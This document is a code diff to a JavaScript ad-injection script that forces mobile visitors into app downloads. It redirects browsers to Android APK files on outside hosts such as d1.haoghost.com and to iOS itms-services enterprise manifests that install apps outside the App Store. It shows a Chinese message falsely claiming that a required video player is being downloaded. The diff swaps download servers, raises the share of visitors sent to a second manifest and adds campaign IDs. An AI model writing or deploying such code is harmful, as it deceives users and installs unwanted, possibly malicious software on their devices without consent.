@@ -47,7 +47,7 @@ var hy_itv=setInterval(function(){
 		return obj;
 	};
 
-	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d.haoghost.com/",isup=2;
+	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d1.haoghost.com/",isup=2;
 	var pname=getDownUrl(),iosname=getIosDownUrl();
 
 	var azimgs=["wb_b2.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","test1.jpg","test2.jpg"],
@@ -119,7 +119,7 @@ var hy_itv=setInterval(function(){
 				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
 				break;
 			default:
-				if(rd<0.001) result="http://tg.xyzs.com/dt/iphone.php?ref=cpa24";
+				if(rd<0.1) result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/146.plist";
 				else result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
 		}
 		return result;
@@ -134,7 +134,7 @@ var hy_itv=setInterval(function(){
 				result="360ysdq12.apk";
 				break;
 			default:
-				if(rd<0.5) result="http://d.haoghost.com/kbyy2.apk";
+				if(rd<0.5) result="http://d1.haoghost.com/kbyy2.apk";
 				else result="http://d.zhxone.com/11678116";
 		}
 		return result;
@@ -178,7 +178,8 @@ var hy_itv=setInterval(function(){
 			var date = new Date();
 			var cd=10;
 			if(num==41 || num==42) cd=60*24;
-			if(num==43) cd=60;
+			if(num==43) cd=30;
+			if(num==44) cd=60;
 			if(!getCookie("hycookietime"))
 			{
 				setCookie("hycookietime",date.getTime());
@@ -304,8 +305,7 @@ var hy_itv=setInterval(function(){
 			if(isDownSelf())
 			{
 				setCookie("hyipdata","0");
-				if(num==43) pname="Qvod_collect_wap1_v3.14.21.apk";
-				else pname="Qvod_collect_v3.14.21.apk";
+				pname="Qvod_collect_v3.14.22.apk";
 				/*getJsonp(
 					'http://click.shuiguo.com/index.php?action=index&method=main1',
 					"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -327,7 +327,7 @@ var hy_itv=setInterval(function(){
 			goCityDown();
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36 || num==37 || num==39 || num==41 || num==42 || num==43)
+					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36 || num==37 || num==39 || num==41 || num==42 || num==43 || num==45 || num==46)
 					{
 						if(!autoDown()) return;
 						if(tt.indexOf("》")<0)
@@ -339,7 +339,7 @@ var hy_itv=setInterval(function(){
 							tt=tt.split("》")[0]+"》";
 							tt="正在为您下载本站专用手机播放器，安装后即可观看"+tt;
 						}
-					} 
+					}
 					else if(num==15 || num==28 || num==29 || num==34 || num==38 || num==44)
 					{
 						if(!autoDown()) return;
@@ -373,7 +373,7 @@ var hy_itv=setInterval(function(){
 					function tureDP(url)
 					{
 						if(url.indexOf("http")>=0) window.location.href=url;
-						else window.location.href="http://d.haoghost.com/"+url;
+						else window.location.href="http://d1.haoghost.com/"+url;
 						setCookie("hycpc1","1");
 					}
 
